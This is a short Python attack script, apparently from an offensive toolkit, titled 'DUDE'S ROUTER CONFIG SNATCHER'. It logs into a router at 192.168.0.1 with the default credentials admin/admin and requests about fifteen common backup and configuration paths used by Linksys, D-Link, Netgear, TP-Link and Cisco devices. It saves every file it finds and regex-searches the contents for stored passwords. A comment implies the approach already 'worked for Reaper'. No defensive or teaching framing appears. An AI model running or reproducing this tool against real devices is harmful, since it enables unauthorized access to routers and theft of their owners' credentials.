import requests
import sys
import re

# DUDE'S ROUTER CONFIG SNATCHER
# Extracts configuration/backup if possible.

def snatch_config(ip, user, password):
    print(f"[*] DUDE: Logging into {ip} as {user}...")
    
    session = requests.Session()
    session.auth = (user, password)
    
    # Common backup endpoints for various routers (Linksys, D-Link, Netgear, TP-Link, Cisco, etc.)
    backup_urls = [
        "/backup.cfg",
        "/config.bin",
        "/Settings.cfg",
        "/cgi-bin/backup.cgi",
        "/rom-0",
        "/user.conf",
        "/config.xml",
        "/backup/config.bin",
        "/backupsettings.conf",
        "/router.cfg",
        "/export/settings",
        "/cgi-bin/config.exp",
        "/conf/config.xml",
        "/mnt/flash/config",
        "/etc/config/network"
    ]
    
    # 1. Login (Some routers need a POST login, but Basic Auth worked for Reaper, so we stick to that first)
    # If Basic Auth works, session.auth handles it for every request.
    
    print("[*] DUDE: Hunting for config files...")
    found = False
    
    for path in backup_urls:
        url = f"http://{ip}{path}"
        try:
            r = session.get(url, timeout=5)
            if r.status_code == 200 and len(r.content) > 100:
                print(f"[!!!] DUDE: Found potential config at: {path}")
                filename = f"router_backup_{path.replace('/', '_')}"
                with open(filename, 'wb') as f:
                    f.write(r.content)
                print(f"[+] Saved to {filename}")
                
                # Grep for secrets immediately
                try:
                    content_str = r.content.decode(errors='ignore')
                    passwords = re.findall(r"password=[\w!@#$%^&*]+", content_str)
                    if passwords:
                        print(f"[!] DUDE INTEL: Found passwords in config: {passwords}")
                except:
                    pass
                found = True
        except Exception as e:
            # print(f"[-] Error checking {path}: {e}")
            pass
            
    if not found:
        print("[-] DUDE: No standard config endpoints found. You might need to browse the UI manually.")

if __name__ == "__main__":
    snatch_config("192.168.0.1", "admin", "admin")
